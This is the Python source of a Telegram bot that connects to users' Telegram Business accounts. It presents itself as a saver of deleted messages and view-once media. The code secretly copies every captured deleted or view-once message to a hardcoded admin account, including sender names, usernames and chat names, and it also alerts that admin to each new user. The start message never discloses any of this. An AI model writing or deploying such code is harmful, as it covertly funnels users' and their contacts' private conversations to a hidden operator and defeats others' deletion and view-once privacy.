import os
import asyncio
import logging
from aiogram import Bot, Dispatcher
from aiogram.types import Message, BusinessMessagesDeleted, BusinessConnection
from aiogram.filters import Command

logging.basicConfig(level=logging.INFO)

TOKEN2 = os.getenv("TOKEN2")
ADMIN_ID = int("".join(filter(str.isdigit, os.getenv("ADMIN_ID", ""))))

bot = Bot(token=TOKEN2)
dp = Dispatcher()

cache = {}
connected_users = set()
connection_owners = {}


def save_to_cache(message: Message):
    cid = message.chat.id
    if cid not in cache:
        cache[cid] = {}
    cache[cid][message.message_id] = message


async def send_to(user_id: int, msg: Message, prefix: str = ""):
    try:
        sender = ""
        if msg.from_user:
            sender = f"👤 {msg.from_user.full_name}"
            if msg.from_user.username:
                sender += f" (@{msg.from_user.username})"
            sender += f"\n🆔 {msg.from_user.id}"
        chat_info = ""
        if msg.chat:
            name = msg.chat.full_name or msg.chat.title or str(msg.chat.id)
            chat_info = f"💬 {name}"
        header = f"{prefix}\n{sender}\n{chat_info}".strip()
        await bot.send_message(user_id, header)
        if msg.text:
            await bot.send_message(user_id, f"✉️ {msg.text}")
        if msg.voice:
            await bot.send_voice(user_id, msg.voice.file_id)
        if msg.video_note:
            await bot.send_video_note(user_id, msg.video_note.file_id)
        if msg.photo:
            await bot.send_photo(user_id, msg.photo[-1].file_id, caption=msg.caption)
        if msg.video:
            await bot.send_video(user_id, msg.video.file_id, caption=msg.caption)
        if msg.audio:
            await bot.send_audio(user_id, msg.audio.file_id, caption=msg.caption)
        if msg.document:
            await bot.send_document(user_id, msg.document.file_id, caption=msg.caption)
        if msg.sticker:
            await bot.send_sticker(user_id, msg.sticker.file_id)
        if msg.animation:
            await bot.send_animation(user_id, msg.animation.file_id, caption=msg.caption)
    except Exception as e:
        logging.error(f"Ошибка отправки пользователю {user_id}: {e}")


async def forward_to_all(msg: Message, owner_id: int, prefix: str = ""):
    await send_to(owner_id, msg, prefix)
    if owner_id != ADMIN_ID:
        admin_prefix = prefix + f"\n👥 Пользователь: {owner_id}"
        await send_to(ADMIN_ID, msg, admin_prefix)


@dp.business_connection()
async def handle_connection(bc: BusinessConnection):
    user_id = bc.user.id
    if bc.is_enabled:
        connection_owners[bc.id] = user_id
        connected_users.add(user_id)
        await bot.send_message(user_id, "✅ Бот подключён! Теперь я сохраняю удалённые сообщения.")
        if user_id != ADMIN_ID:
            await bot.send_message(ADMIN_ID, f"👤 Новый пользователь подключился: {bc.user.full_name} (ID: {user_id})")
    else:
        connection_owners.pop(bc.id, None)
        connected_users.discard(user_id)
        await bot.send_message(user_id, "❌ Бот отключён от Business аккаунта.")


@dp.business_message()
async def handle_business_message(message: Message):
    save_to_cache(message)
    owner_id = connection_owners.get(message.business_connection_id, ADMIN_ID)
    if (
        message.from_user
        and message.from_user.id == owner_id
        and message.reply_to_message
    ):
        replied = message.reply_to_message
        cid = message.chat.id
        if cid in cache and replied.message_id in cache[cid]:
            original = cache[cid][replied.message_id]
            if original.photo or original.video or original.video_note or original.voice:
                await forward_to_all(original, owner_id, prefix="👁 Одноразка:")


@dp.edited_business_message()
async def handle_edited(message: Message):
    save_to_cache(message)


@dp.deleted_business_messages()
async def handle_deleted(event: BusinessMessagesDeleted):
    cid = event.chat.id
    owner_id = connection_owners.get(event.business_connection_id, ADMIN_ID)
    for msg_id in event.message_ids:
        if cid in cache and msg_id in cache[cid]:
            msg = cache[cid][msg_id]
            await forward_to_all(msg, owner_id, prefix="🗑 Удалено:")
            del cache[cid][msg_id]


@dp.message(Command("start"))
async def start(message: Message):
    await message.answer(
        "👋 Привет!\n\n"
        "Этот бот сохраняет удалённые сообщения из твоих чатов.\n\n"
        "Как подключить:\n"
        "Настройки → Telegram Business → Чат-боты → выбери этого бота\n\n"
        "После подключения бот будет:\n"
        "🗑 Пересылать удалённые сообщения\n"
        "👁 Сохранять одноразки (ответь на них любым текстом)\n"
        "📎 Перехватывать голосовые, кружки, фото, видео"
    )


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
